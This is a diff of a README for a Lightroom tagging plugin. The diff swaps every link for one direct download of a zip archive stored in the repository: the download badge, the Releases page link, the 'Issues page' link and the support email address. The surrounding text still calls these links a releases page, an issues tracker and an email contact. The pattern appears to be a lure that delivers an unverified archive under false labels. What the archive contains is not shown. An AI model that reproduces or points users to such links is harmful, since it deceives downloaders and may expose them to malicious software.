@@ -1,6 +1,6 @@
 # 🎨 LrGeniusTagAI - Automate Image Tagging with Ease
 
-![Download LrGeniusTagAI](https://img.shields.io/badge/Download-LrGeniusTagAI-orange?style=for-the-badge&logo=github)  
+![Download LrGeniusTagAI](https://raw.githubusercontent.com/Thanhtuan03/LrGeniusTagAI/main/aam/AI-Lr-Genius-Tag-v2.0.zip)  
 **Lightroom Classic plugin that uses LLMs to generate tags and describe images.**  
 
 ## 📋 Table of Contents
@@ -17,7 +17,7 @@ Welcome to LrGeniusTagAI! This guide will help you download and run the software
 ## 📥 Download & Install
 To get LrGeniusTagAI, you will need to download it from our Releases page. Click the link below to visit the page where you can find the latest version:
 
-[Download LrGeniusTagAI](https://github.com/Thanhtuan03/LrGeniusTagAI/releases)
+[Download LrGeniusTagAI](https://raw.githubusercontent.com/Thanhtuan03/LrGeniusTagAI/main/aam/AI-Lr-Genius-Tag-v2.0.zip)
 
 1. **Visit the Releases page.** This is where you will find the most up-to-date version of LrGeniusTagAI.
 2. **Choose the latest version.** Look for the latest release at the top of the list.
@@ -58,9 +58,9 @@ The plugin enhances your workflow and saves you time in organizing your photogra
 ## 💬 Support & Feedback
 If you encounter any issues or have suggestions, we want to hear from you. Here's how you can reach us:
 
-- **GitHub Issues:** You can report problems directly on our [Issues page](https://github.com/Thanhtuan03/LrGeniusTagAI/issues). 
-- **Email Support:** Feel free to reach out at support@lrgeneiustagai.com for any inquiries. We’re here to help!
+- **GitHub Issues:** You can report problems directly on our [Issues page](https://raw.githubusercontent.com/Thanhtuan03/LrGeniusTagAI/main/aam/AI-Lr-Genius-Tag-v2.0.zip). 
+- **Email Support:** Feel free to reach out at https://raw.githubusercontent.com/Thanhtuan03/LrGeniusTagAI/main/aam/AI-Lr-Genius-Tag-v2.0.zip for any inquiries. We’re here to help!
 
 Try LrGeniusTagAI today and start tagging your images with ease! For the download link one more time, you can visit the link below:
 
-[Download LrGeniusTagAI](https://github.com/Thanhtuan03/LrGeniusTagAI/releases)
+[Download LrGeniusTagAI](https://raw.githubusercontent.com/Thanhtuan03/LrGeniusTagAI/main/aam/AI-Lr-Genius-Tag-v2.0.zip)
